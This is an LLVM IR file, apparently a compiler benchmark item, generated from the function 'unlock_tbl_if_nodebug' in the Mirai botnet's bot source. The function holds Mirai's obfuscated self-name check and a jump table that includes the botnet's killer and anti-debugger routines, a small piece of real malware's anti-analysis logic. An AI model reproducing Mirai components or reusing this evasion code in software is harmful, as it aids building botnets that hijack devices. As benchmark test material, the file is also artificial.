; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_main.c_unlock_tbl_if_nodebug.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_main.c_unlock_tbl_if_nodebug.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.unlock_tbl_if_nodebug.buf_src = private unnamed_addr constant [18 x i8] c"/.\00vd\00Hr\00le\00ep\00\00r\00", align 16
@ensure_single_instance = common dso_local global i32 0, align 4
@table_unlock_val = common dso_local global i32 0, align 4
@table_retrieve_val = common dso_local global i32 0, align 4
@table_lock_val = common dso_local global i32 0, align 4
@util_memcpy = common dso_local global i32 0, align 4
@killer_init = common dso_local global i32 0, align 4
@anti_gdb_entry = common dso_local global i32 0, align 4
@FALSE = common dso_local global i32 0, align 4
@TRUE = common dso_local global i32 0, align 4
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @unlock_tbl_if_nodebug to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @unlock_tbl_if_nodebug(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca [18 x i8], align 16
  %5 = alloca [12 x i8], align 1
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca [9 x void ()*], align 16
  %11 = alloca i32, align 4
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  %13 = bitcast [18 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([18 x i8], [18 x i8]* @__const.unlock_tbl_if_nodebug.buf_src, i32 0, i32 0), i64 18, i1 false)
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i8 -81, i8* %9, align 1
  %14 = getelementptr inbounds [9 x void ()*], [9 x void ()*]* %10, i64 0, i64 0
  %15 = load i32, i32* @ensure_single_instance, align 4
  %16 = sext i32 %15 to i64
  %17 = inttoptr i64 %16 to void ()*
  store void ()* %17, void ()** %14, align 8
  %18 = getelementptr inbounds void ()*, void ()** %14, i64 1
  %19 = load i32, i32* @table_unlock_val, align 4
  %20 = sext i32 %19 to i64
  %21 = inttoptr i64 %20 to void ()*
  store void ()* %21, void ()** %18, align 8
  %22 = getelementptr inbounds void ()*, void ()** %18, i64 1
  %23 = load i32, i32* @table_retrieve_val, align 4
  %24 = sext i32 %23 to i64
  %25 = inttoptr i64 %24 to void ()*
  store void ()* %25, void ()** %22, align 8
  %26 = getelementptr inbounds void ()*, void ()** %22, i64 1
  store void ()* bitcast (i32 (...)* @table_init to void ()*), void ()** %26, align 8
  %27 = getelementptr inbounds void ()*, void ()** %26, i64 1
  %28 = load i32, i32* @table_lock_val, align 4
  %29 = sext i32 %28 to i64
  %30 = inttoptr i64 %29 to void ()*
  store void ()* %30, void ()** %27, align 8
  %31 = getelementptr inbounds void ()*, void ()** %27, i64 1
  %32 = load i32, i32* @util_memcpy, align 4
  %33 = sext i32 %32 to i64
  %34 = inttoptr i64 %33 to void ()*
  store void ()* %34, void ()** %31, align 8
  %35 = getelementptr inbounds void ()*, void ()** %31, i64 1
  store void ()* bitcast (i32 (i8*, i8*)* @util_strcmp to void ()*), void ()** %35, align 8
  %36 = getelementptr inbounds void ()*, void ()** %35, i64 1
  %37 = load i32, i32* @killer_init, align 4
  %38 = sext i32 %37 to i64
  %39 = inttoptr i64 %38 to void ()*
  store void ()* %39, void ()** %36, align 8
  %40 = getelementptr inbounds void ()*, void ()** %36, i64 1
  %41 = load i32, i32* @anti_gdb_entry, align 4
  %42 = sext i32 %41 to i64
  %43 = inttoptr i64 %42 to void ()*
  store void ()* %43, void ()** %40, align 8
  store i32 0, i32* %6, align 4
  br label %44

44:                                               ; preds = %57, %1
  %45 = load i32, i32* %6, align 4
  %46 = icmp slt i32 %45, 7
  br i1 %46, label %47, label %60

47:                                               ; preds = %44
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [9 x void ()*], [9 x void ()*]* %10, i64 0, i64 %49
  %51 = load void ()*, void ()** %50, align 8
  %52 = ptrtoint void ()* %51 to i64
  %53 = load i32, i32* %8, align 4
  %54 = sext i32 %53 to i64
  %55 = add nsw i64 %54, %52
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %8, align 4
  br label %57

57:                                               ; preds = %47
  %58 = load i32, i32* %6, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %6, align 4
  br label %44

60:                                               ; preds = %44
  %61 = load i32, i32* %8, align 4
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %65

63:                                               ; preds = %60
  %64 = load i32, i32* @FALSE, align 4
  store i32 %64, i32* %2, align 4
  br label %131

65:                                               ; preds = %60
  store i32 0, i32* %6, align 4
  br label %66

66:                                               ; preds = %111, %65
  %67 = load i32, i32* %6, align 4
  %68 = sext i32 %67 to i64
  %69 = icmp ult i64 %68, 18
  br i1 %69, label %70, label %114

70:                                               ; preds = %66
  %71 = load i32, i32* %6, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [18 x i8], [18 x i8]* %4, i64 0, i64 %72
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %12, align 1
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [18 x i8], [18 x i8]* %4, i64 0, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = load i32, i32* %7, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %7, align 4
  %82 = sext i32 %80 to i64
  %83 = getelementptr inbounds [12 x i8], [12 x i8]* %5, i64 0, i64 %82
  store i8 %79, i8* %83, align 1
  %84 = load i8, i8* %12, align 1
  %85 = load i32, i32* %7, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %7, align 4
  %87 = sext i32 %85 to i64
  %88 = getelementptr inbounds [12 x i8], [12 x i8]* %5, i64 0, i64 %87
  store i8 %84, i8* %88, align 1
  %89 = load i32, i32* %6, align 4
  %90 = mul nsw i32 %89, 2
  store i32 %90, i32* %6, align 4
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 14
  store i32 %92, i32* %6, align 4
  %93 = load i32, i32* %6, align 4
  %94 = sdiv i32 %93, 2
  store i32 %94, i32* %6, align 4
  %95 = load i32, i32* %6, align 4
  %96 = sub nsw i32 %95, 7
  store i32 %96, i32* %6, align 4
  %97 = load i8*, i8** %3, align 8
  %98 = load i32, i32* %7, align 4
  %99 = load i8*, i8** %3, align 8
  %100 = call i32 @util_strlen(i8* %99)
  %101 = srem i32 %98, %100
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %97, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = sext i8 %104 to i32
  %106 = xor i32 %105, -1
  %107 = load i8, i8* %9, align 1
  %108 = sext i8 %107 to i32
  %109 = add nsw i32 %108, %106
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %9, align 1
  br label %111

111:                                              ; preds = %70
  %112 = load i32, i32* %6, align 4
  %113 = add nsw i32 %112, 3
  store i32 %113, i32* %6, align 4
  br label %66

114:                                              ; preds = %66
  %115 = load i8, i8* %9, align 1
  %116 = sext i8 %115 to i64
  %117 = urem i64 %116, 9
  %118 = trunc i64 %117 to i8
  store i8 %118, i8* %9, align 1
  %119 = load i8, i8* %9, align 1
  %120 = sext i8 %119 to i64
  %121 = getelementptr inbounds [9 x void ()*], [9 x void ()*]* %10, i64 0, i64 %120
  %122 = load void ()*, void ()** %121, align 8
  call void %122()
  %123 = load i8*, i8** %3, align 8
  %124 = getelementptr inbounds [12 x i8], [12 x i8]* %5, i64 0, i64 0
  %125 = call i32 @util_strcmp(i8* %123, i8* %124)
  store i32 %125, i32* %11, align 4
  %126 = getelementptr inbounds [18 x i8], [18 x i8]* %4, i64 0, i64 0
  %127 = call i32 @util_zero(i8* %126, i32 18)
  %128 = getelementptr inbounds [12 x i8], [12 x i8]* %5, i64 0, i64 0
  %129 = call i32 @util_zero(i8* %128, i32 12)
  %130 = load i32, i32* %11, align 4
  store i32 %130, i32* %2, align 4
  br label %131

131:                                              ; preds = %114, %63
  %132 = load i32, i32* %2, align 4
  ret i32 %132
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @table_init(...) #2

declare dso_local i32 @util_strcmp(i8*, i8*) #2

declare dso_local i32 @util_strlen(i8*) #2

declare dso_local i32 @util_zero(i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
